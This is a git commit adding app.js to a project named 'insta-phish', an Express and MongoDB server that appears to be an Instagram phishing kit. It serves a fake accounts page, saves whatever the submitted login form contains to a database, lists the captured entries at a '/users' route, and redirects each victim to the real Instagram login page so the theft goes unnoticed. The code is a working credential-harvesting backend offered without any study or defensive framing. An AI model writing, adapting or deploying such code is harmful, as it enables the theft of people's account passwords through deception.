fecd449b8a1a8c9b2ad8e979784701341af92ba5
techtrum <88105506+techtrum@users.noreply.github.com>
2021-12-09 14:40:17 -0800

    make it better

---
+++ app.js
@@ -0,0 +1,41 @@
+const express = require('express');
+const mongoose = require('mongoose')
+const app = express();
+const path = require('path');
+const User = require('./models/user')
+
+const dbUrl = process.env.DB_URL || 'mongodb://localhost:27017/insta-phish';
+// const dbUrl = 'mongodb://localhost:27017/insta-phish';
+
+mongoose.connect(dbUrl, {useNewUrlParser: true, useUnifiedTopology: true})
+const db = mongoose.connection;
+db.on("error", console.error.bind(console, "connection error:"));
+db.once("open", () => {
+    console.log("Database connected");
+});
+
+app.set('view engine', 'ejs');
+app.set('views', path.join(__dirname, 'views'))
+
+app.use(express.urlencoded({ extended: true }))
+
+app.use(express.static(path.join(__dirname, 'public')));
+
+app.get('/accounts', (req, res) => {
+    res.render('index')
+})
+
+app.get('/users', async(req, res) => {
+    const users = await User.find({})
+    res.render('users', { users })
+})
+
+app.post('/user', async (req, res) => {
+    const user = new User({ ...req.body.user })
+    await user.save();
+    res.redirect('https://instagram.com/accounts/login/?source=auth_switcher')
+})
+
+app.listen(3000, () => {
+    console.log('Serving on port 3000')
+})
